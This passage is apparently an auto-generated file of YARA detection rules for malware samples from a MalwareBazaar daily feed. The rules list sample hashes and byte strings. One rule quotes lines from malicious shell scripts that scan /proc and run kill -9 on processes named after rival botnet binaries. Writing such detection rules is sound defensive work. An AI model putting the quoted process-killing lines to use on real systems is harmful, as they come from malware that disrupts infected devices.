      $s1 = "MzJJlkY" fullword ascii
      $s2 = "=mqulQ\"" fullword ascii
      $s3 = "*].m=J51" fullword ascii
      $s4 = "&bH8 W." fullword ascii
      $s5 = "5#wJTA" fullword ascii
      $s6 = ":;:tL\\h6" fullword ascii
      $s7 = "4p08O@N" fullword ascii
      $s8 = "=$9Q9\\ba" fullword ascii
      $s9 = "~NfAp2" fullword ascii
      $s10 = "g;9<bB4" fullword ascii
      $s11 = ".u-?8k" fullword ascii
      $s12 = "raNBUu" fullword ascii
      $s13 = "k,^W<}" fullword ascii
      $s14 = "\"H 0I\\" fullword ascii
      $s15 = "o&P'| z" fullword ascii
      $s16 = "p&BShr" fullword ascii
      $s17 = "t2[O*?Y" fullword ascii
      $s18 = "k7Y{b+" fullword ascii
      $s19 = "0afuO#" fullword ascii
      $s20 = "'k2+Vv" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550_9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4_27 {
   meta:
      description = "evidences - from files 6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550.rar, 9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550"
      hash2 = "9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0"
   strings:
      $s1 = "X\"WvSD\"Vf" fullword ascii
      $s2 = "hBrkgUf" fullword ascii
      $s3 = "aBYQj$F" fullword ascii
      $s4 = "\\0(6Uc!" fullword ascii
      $s5 = "'TmU*eV" fullword ascii
      $s6 = "l;^y<U" fullword ascii
      $s7 = "{&=DNy" fullword ascii
      $s8 = "h\\J%YX>" fullword ascii
      $s9 = "C8w:(Y" fullword ascii
      $s10 = "3i\"kjI" fullword ascii
      $s11 = "/_aPB\\" fullword ascii
      $s12 = "9JS*JH" fullword ascii
      $s13 = "'uWo(`" fullword ascii
      $s14 = "[/Z?M." fullword ascii
      $s15 = "ZF5lB'" fullword ascii
      $s16 = "MJT^Fp" fullword ascii
      $s17 = "I0L<=BN;b" fullword ascii
      $s18 = "$Cx)'I" fullword ascii
      $s19 = "C|/Lx7" fullword ascii
      $s20 = "aG]c^r" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4_4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe5_28 {
   meta:
      description = "evidences - from files 468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4.msi, 4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630.elf, 5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4"
      hash2 = "4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630"
      hash3 = "5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9"
   strings:
      $s1 = "connection already in progress" fullword ascii /* Goodware String - occured 567 times */
      $s2 = "protocol not supported" fullword ascii /* Goodware String - occured 568 times */
      $s3 = "protocol error" fullword ascii /* Goodware String - occured 588 times */
      $s4 = "permission denied" fullword ascii /* Goodware String - occured 592 times */
      $s5 = "connection refused" fullword ascii /* Goodware String - occured 597 times */
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550_9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4_29 {
   meta:
      description = "evidences - from files 6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550.rar, 9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0.rar, e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550"
      hash2 = "9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0"
      hash3 = "e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782"
   strings:
      $s1 = "PeIDMy7$" fullword ascii
      $s2 = "wF]]W+" fullword ascii
      $s3 = "UT2#Xph" fullword ascii
      $s4 = "Y;G714" fullword ascii
      $s5 = "TD3#E`h" fullword ascii
      $s6 = "z:0::?" fullword ascii
      $s7 = "UT\"3gph" fullword ascii
      $s8 = "UD2$V`hg" fullword ascii
      $s9 = "@DD7@dx" fullword ascii
      $s10 = "<KWoJ)4" fullword ascii
      $s11 = "Iv{ljp\"" fullword ascii
      $s12 = "_`vUD2$f" fullword ascii
      $s13 = "#d\"d%P" fullword ascii
      $s14 = "R>-Fiu" fullword ascii
      $s15 = "4gh@Rrd" fullword ascii
      $s16 = "UT2$VpH" fullword ascii
      $s17 = " Pa#Z*" fullword ascii
      $s18 = "!e$[)(" fullword ascii
      $s19 = "Q,()eA" fullword ascii
      $s20 = "eT2#VpX" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f_c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed_30 {
   meta:
      description = "evidences - from files 50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f.elf, c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed1972a6.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f"
      hash2 = "c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed1972a6"
   strings:
      $s1 = "GLIBC_2.4" fullword ascii
      $s2 = "__gmon_start__" fullword ascii
      $s3 = "__xstat" fullword ascii
      $s4 = "__fxstat" fullword ascii
      $s5 = "__errno_location" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630_c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed_31 {
   meta:
      description = "evidences - from files 4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630.elf, c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed1972a6.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630"
      hash2 = "c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed1972a6"
   strings:
      $s1 = "getspent_r" fullword ascii
      $s2 = "getspnam_r" fullword ascii
      $s3 = "setspent" fullword ascii
      $s4 = "endspent" fullword ascii
      $s5 = "daemon" fullword ascii /* Goodware String - occured 23 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _03d231f7fa4fd382da3a64976a82defc1d310511e289b1742fe9cbbaf87f6fe1_ec48b857433dc1ec2f5f7e9d4a9c1c8995cbb614336cfc6b6ce67a5271_32 {
   meta:
      description = "evidences - from files 03d231f7fa4fd382da3a64976a82defc1d310511e289b1742fe9cbbaf87f6fe1.sh, ec48b857433dc1ec2f5f7e9d4a9c1c8995cbb614336cfc6b6ce67a5271288cc1.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "03d231f7fa4fd382da3a64976a82defc1d310511e289b1742fe9cbbaf87f6fe1"
      hash2 = "ec48b857433dc1ec2f5f7e9d4a9c1c8995cbb614336cfc6b6ce67a5271288cc1"
   strings:
      $s1 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s2 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s3 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s4 = "            kill -9 \"$pid\"" fullword ascii
      $s5 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s6 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "        continue" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 2KB and ( all of them )
      ) or ( all of them )
}

rule _0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364_0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd_33 {
   meta:
      description = "evidences - from files 0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364.msi, 0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217.msi, 468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4.msi, 48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418.msi, 4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b.msi, 5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756.msi, 907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb.msi, e04464a9c2236bdc798c112b4bfbe0d4265fe486154e3601d03e0e60cc1487ab.msi, e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401.msi, f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364"
      hash2 = "0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217"
      hash3 = "468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4"
      hash4 = "48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418"
      hash5 = "4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b"
      hash6 = "5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756"
      hash7 = "907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb"
      hash8 = "e04464a9c2236bdc798c112b4bfbe0d4265fe486154e3601d03e0e60cc1487ab"
      hash9 = "e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401"
      hash10 = "f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d"
   strings:
      $s1 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s2 = "SummaryInformation" fullword wide /* Goodware String - occured 50 times */
      $s3 = "@H??wElDj;" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "B4FhD&B" fullword ascii /* Goodware String - occured 1 times */
      $s5 = ";;B&F7B" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "Intel;1033" fullword ascii
      $s7 = "@H??wElDj>" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "E(?(E8B" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429_c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d_34 {
   meta:
      description = "evidences - from files 31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429.unknown, c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d5bc963.unknown, fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429"
      hash2 = "c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d5bc963"
      hash3 = "fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d"
   strings:
      $s1 = "AAAAADAAAC" ascii /* base64 encoded string '    0  ' */
      $s2 = "4AAAAAAAAAEBAAAA" ascii /* base64 encoded string '       @@  ' */
      $s3 = "AAAAAAEBAAA" ascii
      $s4 = "BAAAAAAAAAA" ascii
      $s5 = "AAAAAcEAAA" ascii
      $s6 = "CAAAAAAAAAAAAAA" ascii
   condition:
      ( ( uint16(0) == 0xd8ff or uint16(0) == 0x3d3d or uint16(0) == 0x413d ) and filesize < 7000KB and ( all of them )
      ) or ( all of them )
}

rule _31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429_9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98_35 {
   meta:
      description = "evidences - from files 31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429.unknown, 9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a.unknown, bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d7934eddc9.unknown, fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429"
      hash2 = "9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a"
      hash3 = "bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d7934eddc9"
      hash4 = "fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d"
   strings:
      $s1 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s2 = "ABAAAAAAAAAAA" ascii
      $s3 = "AAAAAAAABE" ascii
      $s4 = "DAAAAAAAAAE" ascii
      $s5 = "AAAAAAAAB4" ascii
   condition:
      ( ( uint16(0) == 0xd8ff or uint16(0) == 0x413d or uint16(0) == 0x4141 ) and filesize < 7000KB and ( all of them )
      ) or ( all of them )
}

rule _31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429_62cbd2052c88f5415bfddb88b997a150c29cba2f851f0866f40eb87f99_36 {
   meta:
      description = "evidences - from files 31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429.unknown, 62cbd2052c88f5415bfddb88b997a150c29cba2f851f0866f40eb87f993c338d.unknown, 69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb.unknown, 7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e0731ae98d.unknown, c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d5bc963.unknown, e26e65224caa7856e1dbefb47fea82365877084939cf3d196b299dfd2558b45a.unknown, fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429"
      hash2 = "62cbd2052c88f5415bfddb88b997a150c29cba2f851f0866f40eb87f993c338d"
      hash3 = "69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb"
      hash4 = "7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e0731ae98d"
      hash5 = "c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d5bc963"
      hash6 = "e26e65224caa7856e1dbefb47fea82365877084939cf3d196b299dfd2558b45a"
      hash7 = "fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s2 = "AAACAAAAAAAAAAAAAAAAAA" ascii
      $s3 = "EAAACCAAAAAAAAAAAAAAACAAA" ascii
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 3 times */
      $s5 = "05CAAAAAAAAAAAAAA" ascii
   condition:
      ( ( uint16(0) == 0xd8ff or uint16(0) == 0x413d or uint16(0) == 0x4141 or uint16(0) == 0x3d3d ) and filesize < 7000KB and ( all of them )
      ) or ( all of them )
}

rule _31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429_69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589_37 {
   meta:
      description = "evidences - from files 31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429.unknown, 69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb.unknown, fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429"
      hash2 = "69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb"
      hash3 = "fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d"
   strings:
      $s1 = "EAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAEAAA" ascii
      $s3 = "AAAAAAAAAAc2" ascii
      $s4 = "AAAACAAA0E" ascii
      $s5 = "ACAAAAAAAA" ascii /* Goodware String - occured 5 times */
   condition:
      ( ( uint16(0) == 0xd8ff or uint16(0) == 0x4141 or uint16(0) == 0x413d ) and filesize < 7000KB and ( all of them )
      ) or ( all of them )
}

rule _5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24_6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e1155_38 {
   meta:
      description = "evidences - from files 5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24.elf, 6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24"
      hash2 = "6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867"
   strings:
      $s1 = "HApfMe;" fullword ascii
      $s2 = "aOml1F" fullword ascii
      $s3 = "}w<D(2-_" fullword ascii
      $s4 = "Js>6P." fullword ascii
      $s5 = "a`moama`mca`o" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( all of them )
      ) or ( all of them )
}
